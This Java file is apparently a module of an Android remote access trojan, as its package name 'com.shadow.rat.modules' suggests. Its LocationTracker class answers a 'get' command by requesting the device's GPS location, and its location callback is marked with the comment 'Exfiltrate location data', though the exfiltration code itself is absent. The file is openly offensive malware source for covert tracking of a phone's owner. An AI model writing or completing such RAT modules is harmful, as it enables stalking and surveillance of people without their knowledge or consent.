package com.shadow.rat.modules;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;

public class LocationTracker implements Module, LocationListener {

    private final Context context;
    private LocationManager locationManager;

    public LocationTracker(Context context) {
        this.context = context;
    }

    @Override
    public String execute(String command) {
        if (command.equalsIgnoreCase("get")) {
            return getLocation();
        }
        return "Unknown command for LocationTracker. Available commands: get";
    }

    private String getLocation() {
        locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        try {
            locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, this, null);
            return "Requesting location update.";
        } catch (SecurityException e) {
            return "Location permission not granted.";
        }
    }

    @Override
    public void onLocationChanged(Location location) {
        // Exfiltrate location data
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(String provider) {

    }

    @Override
    public void onProviderDisabled(String provider) {

    }
}
